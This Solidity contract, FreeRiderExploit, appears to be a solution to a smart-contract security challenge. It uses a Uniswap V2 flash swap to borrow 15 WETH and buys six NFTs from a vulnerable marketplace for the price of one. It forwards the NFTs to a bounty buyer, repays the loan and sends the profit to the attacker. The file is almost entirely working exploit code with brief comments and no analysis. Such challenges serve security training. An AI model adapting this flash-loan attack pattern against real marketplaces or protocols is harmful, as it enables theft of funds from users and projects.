// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IWETH {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}
interface IFreeRiderNFTMarketplace {
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
    function buyMany(uint256[] calldata tokenIds) external payable;
    function token() external returns (IERC721);
}

contract FreeRiderExploit is IUniswapV2Callee, IERC721Receiver {

    address immutable attacker;
    IUniswapV2Pair immutable uniswapPair;
    IFreeRiderNFTMarketplace immutable marketplace;
    IERC721 immutable nft;
    IWETH immutable weth;
    address immutable freeRiderBuyer;

    constructor(
        IUniswapV2Pair _uniswapPair,
        IFreeRiderNFTMarketplace _marketplace,
        address _nftAddress,
        address _wethAddress,
        address _freeRiderBuyer
    ) {
        attacker = msg.sender;
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        nft = IERC721(_nftAddress);
        weth = IWETH(_wethAddress);
        freeRiderBuyer = _freeRiderBuyer;
    }

    // exploit function that triggers the flash swap from Uniswap
    function attack() external {
        uniswapPair.swap(15 ether, 0, address(this), hex"01");
    }

    // callback from Uniswap
    function uniswapV2Call(address, uint, uint, bytes calldata) external override {
        // converts borrowed WETH to ETH
        weth.withdraw(15 ether); 

        // buys all NFTs from the marketplace
        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0; tokenIds[1] = 1; tokenIds[2] = 2; tokenIds[3] = 3; tokenIds[4] = 4; tokenIds[5] = 5;
        marketplace.buyMany{value: 15 ether}(tokenIds);

        // transfers all NFTs to the buyer
        for (uint8 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), freeRiderBuyer, i);
        }

        // computes Uniswap fee and returns the borrowed amount (+ fee)
        uint256 fee = ((15 ether * 3) / uint256(997)) + 1;
        weth.deposit{value: 15 ether + fee}();
        weth.transfer(address(uniswapPair), 15 ether + fee);

        // transfers ETH balance to the attacker
        payable(attacker).transfer(address(this).balance);
    }

    // accepts NFTs without any checks 
    function onERC721Received(address /* operator */, address /* from */, uint256 /* tokenId */, bytes calldata /* data */) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}